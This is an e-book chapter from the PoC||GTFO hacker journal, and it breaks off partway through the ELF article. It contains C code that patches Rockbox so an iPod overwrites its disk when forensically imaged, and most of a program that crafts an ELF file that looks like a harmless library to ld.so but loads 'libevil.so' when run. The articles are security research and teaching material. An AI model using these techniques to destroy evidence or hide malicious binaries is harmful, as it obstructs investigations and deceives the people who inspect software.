<?xml version="1.0" encoding="UTF-8"?>
<html xml:lang="en-us" lang="en-us" xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis">
<head>
<title>PoC || GTFO</title>
<link rel="stylesheet" type="text/css" href="../styles/9781593278816.css"/>
</head>
<body>
<h2 class="h2s" id="ch00"><span epub:type="pagebreak" id="page_13"/><strong>0 A CFP with POC</strong></h2>
<h3 class="h3" id="ch00lev1sec1"><strong>0:1 Let us begin!</strong></h3>
<p class="noindent">This first release of our fine journal was distributed on paper in Las Vegas in the summer of 2013, inspired by a night of good conversation about the harsh realities of academic publishing. Fueled by a bit too much scotch, Pastor Laphroaig called upon his neighbors to send their favorite clever tricks, which were stapled together and printed for sharing. Try as we might to be embarrassed by our humble beginnings, we love these early articles and think you will, too.</p>
<p class="indent">In PoC<span class="ent">&#8741;</span>GTFO <a href="ch00.xhtml#ch00lev1sec2">0:2</a>, Travis Goodspeed will show you how to build your own antiforensic hard disk out of an iPod by patching the open source Rockbox firmware. The result is a USB disk, one which still plays music but will self destruct if forensically imaged. It will never give you up, and it will never let you down.</p>
<p class="indent">In PoC<span class="ent">&#8741;</span>GTFO <a href="ch00.xhtml#ch00lev1sec3">0:3</a>, Julian Bangert and Sergey Bratus provide some nifty tricks for abusing the differences in ELF dialect between <span class="literal">exec()</span> and <span class="literal">ld.so</span>. As an example, they produce a file that is both a library and an executable, to the great confusion of reverse engineers and their totally legitimate IDA Pro licenses.</p>
<p class="indent">PoC<span class="ent">&#8741;</span>GTFO <a href="ch00.xhtml#ch00lev1sec5">0:4</a> is a sermon on the subjects of Bitcoin, Phrack, and the den of iniquity known as the RSA Conference, inviting all of you to kill some trees in order to save some souls. It brings the joyful news that we might finally shut up about hat colors and get back to hacking!</p>
<p class="indent"><span epub:type="pagebreak" id="page_14"/>Delivering more nifty ELF research, Bx presents in PoC<span class="ent">&#8741;</span>GTFO <a href="ch00.xhtml#ch00lev1sec6">0:5</a> a trick for returning from the ELF loader into a libc function by abuse of the <span class="literal">IFUNC</span> symbol. There&#8217;s a catch, though, which is that on amd64 her routine needs to pass a very restricted set of arguments. The first parameter must be zero, the second must be the address of the function being called, and the third argument must be the address of the symbol being dereferenced. This article ends in a cliffhanger, which is resolved in PoC<span class="ent">&#8741;</span>GTFO <a href="ch02.xhtml#ch02lev1sec6">2:6</a> when she shares with us the tricks needed to call <span class="literal">putchar()</span> and <span class="literal">getchar()</span>.</p>
<p class="indent">Remembering good times, PoC<span class="ent">&#8741;</span>GTFO <a href="ch00.xhtml#ch00lev1sec7">0:6</a> by FX tells us of an adventure with Barnaby Jack, one which features a golden vending machine and some healthy advice to get the fuck out of Abu Dhabi.</p>
<div class="image"><img src="../images/f0014_01.jpg" alt="Image"/></div>
<h3 class="h3" id="ch00lev1sec2"><span epub:type="pagebreak" id="page_15"/><strong>0:2 iPod Antiforensics</strong></h3>
<p class="att"><em>by Travis Goodspeed</em></p>
<p class="indent">In my lecture introducing Active Disk Antiforensics at 29C3, I presented tricks for emulating a disk with self defense features using the Facedancer board. This brief article will show you how to build your own antiforensic disk out of an iPod by patching the Rockbox framework.</p>
<p class="indent">To quickly summarize that lecture: (1) USB Mass Storage is just a wrapper for SCSI. We can implement these protocols and make our own disks. (2) A legitimate host will follow the filesystem and partition data structure, while a malicious host&#8212;that is to say, a forensics investigator&#8217;s workstation&#8212;will read the disk image from beginning to end. There are other ways to distinguish hosts, but this one is the easiest and has the fewest false positives. (3) By overwriting its contents as it is being imaged, a disk can destroy whatever evidence or information the forensics investigator wishes to obtain.</p>
<p class="indent">There are, of course, exceptions to the above rules. Some high-end forensics software will image a disk backward from the last sector toward the first. A law-enforcement forensics lab will never mount a volume before imaging it, but an amateur less concerned with a clean prosecution might just copy the protected files out of the volume.</p>
<p class="indent">Finally, there is the risk that an antiforensic disk might be identified as such by a forensic investigator. The disk&#8217;s security relies upon the technician triggering the erasure, and it won&#8217;t be sufficient if the technician knows to work around the defenses. For example, he could revert to the recovery ROM or read the disk directly.</p>
<div class="image"><span epub:type="pagebreak" id="page_16"/><img src="../images/f0016_01.jpg" alt="Image"/></div>
<h4 class="h4" id="ch00lev2sec1"><span epub:type="pagebreak" id="page_17"/><strong>Patching Rockbox</strong></h4>
<p class="noindent">Rockbox exposes its hard disk to the host through USB Mass Storage, where handler functions implement each of the SCSI commands needed for that protocol. To add antiforensics, it is necessary only to hook two of those functions: <span class="literal">READ(10)</span> and <span class="literal">WRITE(10)</span>.</p>
<p class="indent">In <span class="literal">firmware/usbstack/usb_storage.c</span> of the Rockbox source code, blocks are read in two places. The first of these is in <span class="literal">handle_scsi()</span>, near the <span class="literal">SCSI_READ_10</span> case. At the end of this case, you should see a call to <span class="literal">send_and_read_next()</span>, which is the second function that must be patched.</p>
<p class="indent">In <em>both</em> of these, it is necessary to add code to both (1) observe incoming requests for illegal traffic and (2) overwrite sectors as they are requested after the disk has detected tampering. Because of code duplication, you will find that some data leaks out through <span class="literal">send_and_read_next()</span> if you only patch <span class="literal">handle_-scsi()</span>. (If these function names mean nothing to you, then you do not have the Rockbox code open, and you won&#8217;t get much out of this article, now will you? Open the damn code!)</p>
<p class="indent">On an iPod, there will never be any legitimate reads over USB to the firmware partition. For our PoC, let&#8217;s trigger self-destruction when that region is read. As this is just a PoC, this patch will provide nonsense replies to reads instead of destroying the data. Also, the hard coded values might be specific to the 2048-byte sector devices, such as the iPod Video.</p>
<p class="indent">The following code should be placed in the <span class="literal">SCSI_READ_10</span> case of <span class="literal">handle_scsi()</span>. <span class="literal">tamperdetected</span> is a static boolean that ought to be declared earlier in <span class="literal">usb_storage.c</span>. The same code should go into the <span class="literal">send_and_read_next()</span> function.</p>
<p class="programs"><span epub:type="pagebreak" id="page_18"/>&#160;1 //<span class="codeitalic">These sectors are for 2048-byte sectors</span>.<br/>&#160;&#160;&#160;//<span class="codeitalic">Multiply by 4 for devices with 512-byte sectors</span>.<br/>&#160;3 if(cur_cmd.sector&gt;=10000 &#38;&#38; cur_cmd.sector&lt;48000)<br/>&#160;&#160;&#160;&#160;&#160;tamperdetected=true;<br/>&#160;5<br/>&#160;&#160;&#160;//<span class="codeitalic">This is the legitimate read</span>.<br/>&#160;7 cur_cmd.last_result = storage_read_sectors(<br/>&#160;&#160;&#160;&#160;&#160;IF_MD2(cur_cmd.lun,) cur_cmd.sector,<br/>&#160;9&#160;&#160;&#160;MIN(READ_BUFFER_SIZE/SECTOR_SIZE, cur_cmd.count),<br/>&#160;&#160;&#160;&#160;&#160;cur_cmd.data[cur_cmd.data_select]<br/>11&#160;);<br/><br/>13 //<span class="codeitalic">Here, we wipe the buffer to demo antiforensics</span>.<br/>&#160;&#160;&#160;if(tamperdetected){<br/>15&#160;&#160;&#160;for(i=0;i&lt;READ_BUFFER_SIZE;i++)<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;cur_cmd.data[cur_cmd.data_select][i]=0xFF;<br/>17&#160;&#160;&#160;//<span class="codeitalic">Clobber the buffer for testing</span>.<br/>&#160;&#160;&#160;&#160;&#160;strcpy(cur_cmd.data[cur_cmd.data_select],<br/>19&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;"Never gonna let you down.");<br/><br/>21&#160;&#160;&#160;//<span class="codeitalic">Comment the following to make a harmless demo</span>.<br/>&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">This writes the buffer back to the disk</span>,<br/>23&#160;&#160;&#160;//<span class="codeitalic">eliminating any of the old contents</span>.<br/>&#160;&#160;&#160;&#160;&#160;if(cur_cmd.sector&gt;=48195)<br/>25&#160;&#160;&#160;&#160;&#160;storage_write_sectors(<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;IF_MD2(cur_cmd.lun,)<br/>27&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cur_cmd.sector,<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MIN(WRITE_BUFFER_SIZE/SECTOR_SIZE, cur_cmd.count),<br/>29&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cur_cmd.data[cur_cmd.data_select]);<br/>&#160;&#160;&#160;}</p>
<div class="image"><img src="../images/f0018_01.jpg" alt="Image"/></div>
<h4 class="h4" id="ch00lev2sec2"><span epub:type="pagebreak" id="page_19"/><strong>Bypassing Antiforensics</strong></h4>
<p class="noindent">This sort of an antiforensic disk can be most easily bypassed by placing the iPod into Disk Mode, which can be done by a series of key presses. For example, the iPod Video is placed into Disk Mode by holding the Select and Menu buttons to reboot, then holding Select and Play/Pause to enter Disk Mode. Be sure that the device is at least partially charged, or it will continue to reboot. Another, surer method, is to physically remove the disk from the iPod and read it manually.</p>
<p class="indent">Further, this PoC does not erase evidence of its own existence. A full and proper implementation ought to replace the firmware partition at the beginning of the disk with a clean Rockbox build of the same revision and also expand later partitions to fill the disk.</p>
<h4 class="h4" id="ch00lev2sec3"><strong>Neighborly Greetings</strong></h4>
<p class="noindent">Kind thanks are due to The Grugq and Int80 for their work on traditional antiforensics of filesystems and file formats, as well as to Scott Moulton for discretely correcting a few of my false assumptions about real-world forensics.</p>
<p class="indent">Thanks are also due to my coauthors on an as-yet-unpublished paper<sup><a id="ch00fn_1"/><a href="footnote.xhtml#ch00fn1">1</a></sup> which predates all of my active antiforensics work but is being held up by the usual academic nonsense.</p>
<h3 class="h3" id="ch00lev1sec3"><span epub:type="pagebreak" id="page_20"/><strong>0:3 ELFs are dorky, Elves are cool</strong></h3>
<p class="att"><em>by Sergey Bratus and Julian Bangert</em></p>
<p class="indent">The ELF ABI is beautiful. It&#8217;s one format to rule all the tools: when a compiler writes a love letter to the linker about its precious objects, it uses ELF; when the RTLD performs runtime relocation surgery, it goes by ELF; when the kernel writes an epitaph for an uppity process, it uses ELF. Think of a possible world where binutils would use their own separate formats, all alike, leaving you to navigate the maze; or think of how ugly a binary format that&#8217;s all things to all tools could turn out to be (*cough* ASN.1, X.509 *cough*), and how hard it&#8217;d be to support, say, ASLR on top of it. Yet ELF is beautiful.</p>
<p class="indent">Verily, when two parsers see two different structures in the same bunch of bytes, trouble ensues. A difference in parsing of X.509 certificates nearly broke the Internet&#8217;s SSL trust model.<sup><a id="ch00fn_2"/><a href="footnote.xhtml#ch00fn2">2</a></sup> The latest Android Master Key bugs that compromised APK signature verification are due to different interpretation of archive metadata by Java and C++ parsers/unzippers<sup><a id="ch00fn_3"/><a href="footnote.xhtml#ch00fn3">3</a></sup>&#8212;yet another security model-breaking parser differential. Similar issues with parsing other common formats and protocols may yet destroy remaining trust in the open Internet.</p>
<p class="indent">ELF is beautiful, but with great beauty there comes great responsibility&#8212;for its parsers.<sup><a id="ch00fn_4"/><a href="footnote.xhtml#ch00fn4">4</a></sup> So do all the different binutils components as well as the Linux kernel see the same contents in an ELF file? This PoC shows that&#8217;s not the case.</p>
<p class="indent"><span epub:type="pagebreak" id="page_21"/>There are two major parsers that handle ELF data. One of them is in the Linux kernel&#8217;s implementation of <span class="literal">execve(2)</span> that creates a new process virtual address space from an ELF file. The other&#8212;since the majority of executables are dynamically linked&#8212;is the RTLD <span class="literal">ld.so(8)</span>, which on your system may be called something like <span class="literal">/lib64/ld-linux-x86-64.so.2</span>,<sup><a id="ch00fn_5"/><a href="footnote.xhtml#ch00fn5">5</a></sup> which loads and links your shared libraries&#8212;into the same address space.</p>
<p class="indent">It would seem that the kernel&#8217;s and the RTLD&#8217;s views of this address space must be the same, that their respective parsers should agree on just what spans of bytes are loaded at which addresses. As luck and Linux would have it, they do not.</p>
<p class="indent">The RTLD is essentially a complex name service for the process namespace that needs a whole lot of configuration in the ELF file, as complex a tree of C structs as any. By contrast, the kernel side just looks for a flat table of offsets and lengths of the file&#8217;s byte segments to load into non-overlapping address ranges. RTLD&#8217;s configuration is held by the <span class="literal">.dynamic</span> section, which serves as a directory of all the relevant symbol tables, their related string tables, relocation entries for the symbols, and so on.<sup><a id="ch00fn_6"/><a href="footnote.xhtml#ch00fn6">6</a></sup> The kernel merely looks past the ELF header for the flat table of loadable segments and proceeds to load these into memory.</p>
<div class="image"><img src="../images/f0021_01.jpg" alt="Image"/></div>
<p class="indent"><span epub:type="pagebreak" id="page_22"/>As a result of this double vision, the kernel&#8217;s view and the RTLD&#8217;s view of what belongs in the process address space can be made starkly different. A <span class="literal">libpoc.so</span> would look like a perfectly sane library to RTLD, calling an innocent &#8220;Hello world&#8221; function from an innocent <span class="literal">libgood.so</span> library. However, when run as an executable it would expose a different <span class="literal">.dynamic</span> table, link in a different library, <span class="literal">libevil.so</span>, and call a very different function, such as dropping a shell. It should be noted that <span class="literal">ld.so</span> is also an executable and can be used to launch actual executables lacking executable permissions, a known trick from the Unix antiquity;<sup><a id="ch00fn_7"/><a href="footnote.xhtml#ch00fn7">7</a></sup> however, its construction is different.</p>
<p class="indent">The core of this PoC, <span class="literal">makepoc.c</span> that crafts the dual-use ELF binary, is a rather nasty C program. It is, in fact, a backport to C of our Ruby ELF manipulation tool, Mithril,<sup><a id="ch00fn_8"/><a href="footnote.xhtml#ch00fn8">8</a></sup> inspired by ERESI, but intended for liberally rewriting binaries rather than for ERESI&#8217;s subtle surgery on the live process space.</p>
<p class="programs"><span epub:type="pagebreak" id="page_23"/>&#160;&#160;&#160;&#160;/*&#160;&#160;-------------------- <span class="codeitalic">makepoc.c</span> -----------------------*/<br/>&#160;2&#160;&#160;/*&#160;&#160;<span class="codeitalic">I met a professor of arcane degree</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">Who said: Two vast and handwritten parsers</span><br/>&#160;4&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">Live in the wild. Near them, in the dark</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">Half sunk, a shattering exploit lies, whose&#160;&#160;frown</span>,<br/>&#160;6&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">And wrinkled lip, and sneer of cold command</span>,<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">Tell that its sculptor well those papers read</span><br/>&#160;8&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">Which yet survive, stamped on these lifeless things</span>,<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">The hand that mocked them and the student that fed</span> :<br/>&#160;10&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">And on the terminal these words appear</span>:<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">"My name is Turing, wrecker of proofs</span>:<br/>&#160;12&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">Parse this unambigously, ye machine, and&#160;&#160;despair</span>!"<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">Nothing besides is possible. Round the decay</span><br/>&#160;14&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">Of that colossal wreck, boundless and bare</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">The lone and level root shells fork away</span>.<br/>&#160;16&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-- <span class="codeitalic">Inspired by Edward Shelley</span>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*/<br/>&#160;&#160;&#160;&#160;# include &lt;elf.h&gt;<br/>&#160;18 # include &lt;stdio.h&gt;<br/>&#160;&#160;&#160;&#160;# include &lt;stdlib.h&gt;<br/>&#160;20 # include &lt;string.h&gt;<br/>&#160;&#160;&#160;&#160;# include &lt;assert.h&gt;<br/>&#160;22 # define PAGESIZE&#160;&#160;4096<br/>&#160;&#160;&#160;&#160;size_t filesz;<br/>&#160;24<br/>&#160;&#160;&#160;&#160;// <span class="codeitalic">This is the enormous buffer holding the ELF file</span>.<br/>&#160;26 // <span class="codeitalic">For neighbours running this on an Electronica BK</span>,<br/>&#160;&#160;&#160;&#160;// <span class="codeitalic">the size might have to be reduced</span>.<br/>&#160;28 char file[3*PAGESIZE];<br/><br/>&#160;30 Elf64_Phdr *find_dynamic(Elf64_Phdr *phdr);<br/>&#160;&#160;&#160;&#160;uint64_t find_dynstr(Elf64_Phdr *phdr);<br/>&#160;32<br/>&#160;&#160;&#160;&#160;/* <span class="codeitalic">New memory layout</span><br/>&#160;34&#160;&#160;&#160;<span class="codeitalic">Memory&#160;&#160;&#160;&#160;&#160;mapped to&#160;&#160;&#160;&#160;File Offsets</span><br/>&#160;&#160;&#160;&#160;<span class="codeitalic">0k ++++|&#160;&#160;&#160;&#160;&#160;|&#160;&#160;&#160;&#160;&#160;&#160;|ELF Header&#160;&#160;&#160;&#160;&#160;&#160;| ---|</span><br/>&#160;36&#160;&#160;&#160;&#160;<span class="codeitalic">+&#160;&#160;&#160;|1 st |***** |(orig.&#160;&#160;code)&#160;&#160;&#160;|&#160;&#160;| |</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">+&#160;&#160;&#160;|Page |&#160;&#160;&#160;&#160;&#160;&#160;|(real&#160;&#160;.dynamic)|&lt;-|-+</span><br/>&#160;38 <span class="codeitalic">4k +&#160;&#160;&#160;+====+&#160;&#160;&#160;&#160;&#160;&#160;&#160;+===============+&#160;&#160;&#160;| |</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">+&#160;&#160;&#160;|&#160;&#160;&#160;&#160;|&#160;&#160;&#160;&#160;&#160;&#160;&#160;|&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;|</span><br/>&#160;40&#160;&#160;&#160;&#160;<span class="codeitalic">++&gt; |2nd |*&#160;&#160;&#160;&#160;&#160;&#160;|kernel_phdr&#160;&#160;&#160;&#160;|&lt;--|--</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">|Page| *&#160;&#160;&#160;&#160;&#160;|&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;|</span><br/>&#160;42&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">|&#160;&#160;&#160;&#160;|&#160;&#160;*&#160;&#160;&#160;&#160;|&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;|</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">+====+&#160;&#160;&#160;*&#160;&#160;&#160;+===============+</span><br/>&#160;44&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">*&#160;&#160;|ldso_phdrs&#160;&#160;&#160;&#160;&#160;|---|</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">|fake .dynamic&#160;&#160;| &lt;-|</span><br/>&#160;46&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">| w/ new dynstr |</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">=================</span><br/><span epub:type="pagebreak" id="page_24"/>&#160;48&#160;&#160;&#160;&#160;<span class="codeitalic">Somewhere far below, there is the .data segment</span>,<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">which we ignore</span>.<br/>&#160;50<br/>&#160;&#160;&#160;&#160;<span class="codeitalic">LD.so/kernel boundary assumes the offset that applies on disk</span><br/>&#160;52 <span class="codeitalic">works also in memory; however, if phdrs are in a&#160;&#160;different</span><br/>&#160;&#160;&#160;&#160;<span class="codeitalic">segment, this won't hold</span>.<br/>&#160;54 */<br/>&#160;&#160;&#160;&#160;int elf_magic(){<br/>&#160;56&#160;&#160;&#160;Elf64_Ehdr *ehdr = file;<br/>&#160;&#160;&#160;&#160;&#160;&#160;Elf64_Phdr *orig_phdrs&#160;&#160;= file + ehdr -&gt;e_phoff;<br/>&#160;58&#160;&#160;&#160;Elf64_Phdr *firstload,*phdr;<br/>&#160;&#160;&#160;&#160;&#160;&#160;int i =0;<br/>&#160;60&#160;&#160;&#160;//<span class="codeitalic">For the sake of brevity, we assume a lot about the layout</span>.<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">First 4K has the mapped parts of&#160;&#160;program</span><br/>&#160;62&#160;&#160;&#160;//<span class="codeitalic">2nd 4K holds the program headers for the kernel</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">3rd 4k holds the program headers for ld.so +</span><br/>&#160;64&#160;&#160;&#160;assert(filesz&gt;PAGESIZE);<br/>&#160;&#160;&#160;&#160;&#160;&#160;assert(filesz&lt;2*PAGESIZE);<br/>&#160;66<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">The new dynamic section is mapped just above the program</span>.<br/>&#160;68&#160;&#160;&#160;for(firstload = orig_phdrs; firstload-&gt;p_type!=PT_LOAD;<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;firstload++);<br/>&#160;70&#160;&#160;&#160;assert(0 == firstload-&gt;p_offset);<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">2nd page of memory will hold 2nd segment</span>.<br/>&#160;72&#160;&#160;&#160;assert(PAGESIZE &gt; firstload-&gt;p_memsz);<br/>&#160;&#160;&#160;&#160;&#160;&#160;uint64_t base_addr = (firstload-&gt;p_vaddr &#38; ~0xffful);<br/>&#160;74<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">PHDRS as read by the kernel's execve() or dlopen()</span>,<br/>&#160;76&#160;&#160;&#160;//<span class="codeitalic">but NOT seen by ld.so</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;Elf64_Phdr *kernel_phdrs = file + filesz;<br/>&#160;78&#160;&#160;&#160;memcpy(kernel_phdrs,orig_phdrs,&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">copy PHDRs</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ehdr-&gt;e_phnum * sizeof(Elf64_Phdr));<br/>&#160;80&#160;&#160;&#160;//<span class="codeitalic">Point ELF header to new PHDRs</span>.<br/>&#160;&#160;&#160;&#160;&#160;&#160;ehdr-&gt;e_phoff = (char *)kernel_phdrs - file;<br/>&#160;82&#160;&#160;&#160;ehdr-&gt;e_phnum++;<br/><br/>&#160;84&#160;&#160;&#160;//<span class="codeitalic">Add a new segment (PT_LOAD), see above diagram</span>.<br/>&#160;&#160;&#160;&#160;&#160;&#160;Elf64_Phdr *new_load = kernel_phdrs + ehdr-&gt;e_phnum -&#160;&#160;1;<br/>&#160;86&#160;&#160;&#160;new_load-&gt;p_type = PT_LOAD;<br/>&#160;&#160;&#160;&#160;&#160;&#160;new_load-&gt;p_vaddr =&#160;&#160;base_addr + PAGESIZE;<br/>&#160;88&#160;&#160;&#160;new_load-&gt;p_paddr = new_load-&gt;p_vaddr;<br/>&#160;&#160;&#160;&#160;&#160;&#160;new_load-&gt;p_offset = 2*PAGESIZE;<br/>&#160;90&#160;&#160;&#160;new_load-&gt;p_filesz = PAGESIZE;<br/>&#160;&#160;&#160;&#160;&#160;&#160;new_load-&gt;p_memsz = new_load-&gt;p_filesz;<br/>&#160;92&#160;&#160;&#160;new_load-&gt;p_flags = PF_R | PF_W;<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">Disable large pages or ld.so complains when loading as .so</span><br/>&#160;94&#160;&#160;&#160;for(i=0;i&lt;ehdr-&gt;e_phnum;i++){<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if(kernel_phdrs[i].p_type == PT_LOAD)<br/><span epub:type="pagebreak" id="page_25"/>&#160;96&#160;&#160;&#160;&#160;&#160;kernel_phdrs [i].p_align = PAGESIZE;<br/>&#160;&#160;&#160;&#160;&#160;&#160;}<br/>&#160;98<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">Setup the PHDR table to be seen by ld.so</span>,<br/>100&#160;&#160;&#160;//<span class="codeitalic">not kernel's execve()</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;Elf64_Phdr *ldso_phdrs = file + ehdr -&gt;e_phoff<br/>102&#160;&#160;&#160;&#160;&#160;- PAGESIZE&#160;&#160;&#160;&#160;// <span class="codeitalic">First 4K is mapped in old segment</span>.<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;+ 2*PAGESIZE; // <span class="codeitalic">Offset of new segment</span>.<br/>104&#160;&#160;&#160;memcpy(ldso_phdrs,<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;kernel_phdrs,ehdr-&gt;e_phnum * sizeof(Elf64_Phdr));<br/>106&#160;&#160;&#160;//<span class="codeitalic">ld.so 2.17 determines load bias (ASLR)</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">of main binary by looking at PT_PHDR</span><br/>108&#160;&#160;&#160;for(phdr=ldso_phdrs;phdr-&gt;p_type != PT_PHDR;phdr++);<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">ld.so expects PHDRS at this vaddr</span><br/>110&#160;&#160;&#160;phdr-&gt;p_paddr = base_addr + ehdr-&gt;e_phoff;<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">This isn't used to find the PHDR table</span>,<br/>112&#160;&#160;&#160;//<span class="codeitalic">but by ld.so to compute ASLR slide</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">(main_map-&gt;l_addr) as (actual PHDR address)-(PHDR address</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<span class="codeitalic">in PHDR table)</span><br/>114&#160;&#160;&#160;phdr-&gt;p_vaddr = phdr-&gt;p_paddr;<br/><br/>116&#160;&#160;&#160;//<span class="codeitalic">Make a new .dynamic table at the end of the</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">second segment to load libevil instead of libgood</span>.<br/>118&#160;&#160;&#160;unsigned dynsz = find_dynamic(orig_phdrs)-&gt;p_memsz;<br/>&#160;&#160;&#160;&#160;&#160;&#160;Elf64_Dyn *old_dyn =<br/>120&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file + find_dynamic (orig_phdrs)-&gt;p_offset;<br/>&#160;&#160;&#160;&#160;&#160;&#160;Elf64_Dyn *ldso_dyn = (char *)ldso_phdrs<br/>122&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;+ ehdr-&gt;e_phnum * sizeof(Elf64_Phdr);<br/>&#160;&#160;&#160;&#160;&#160;&#160;memcpy(ldso_dyn, old_dyn, dynsz);<br/>124&#160;&#160;&#160;//<span class="codeitalic">Modify address of dynamic table in ldso_phdrs</span>,<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">which is only used in exec()</span>.<br/>126&#160;&#160;&#160;find_dynamic(ldso_phdrs)-&gt;p_vaddr =<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;base_addr + (char*)ldso_dyn - file - PAGESIZE;<br/>128<br/>&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">We need a new dynstr entry.&#160;&#160;Luckily ld.so doesn't do</span><br/>130&#160;&#160;&#160;//<span class="codeitalic">range checks on strtab offsets, so we stick it at the end</span>.<br/>&#160;&#160;&#160;&#160;&#160;&#160;char *ldso_needed_str = (char *)ldso_dyn +<br/>132&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ehdr-&gt;e_phnum * sizeof(Elf64_Phdr) + dynsz;<br/>&#160;&#160;&#160;&#160;&#160;&#160;strcpy(ldso_needed_str, "libevil.so");<br/>134&#160;&#160;&#160;//<span class="codeitalic">replace 1st dynamic entry, DT_NEEDED</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;assert(ldso_dyn-&gt;d_tag == DT_NEEDED);<br/>136&#160;&#160;&#160;ldso_dyn-&gt;d_un.d_ptr =<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;base_addr + ldso_needed_str - file<br/>138&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;- PAGESIZE - find_dynstr(orig_phdrs);<br/>&#160;&#160;&#160;&#160;&#160;}<br/>140&#160;&#160;void readfile(){<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;FILE *f= fopen("target.handchecked","r");<br/>142&#160;&#160;&#160;&#160;//<span class="codeitalic">Use provided binary because this PoC 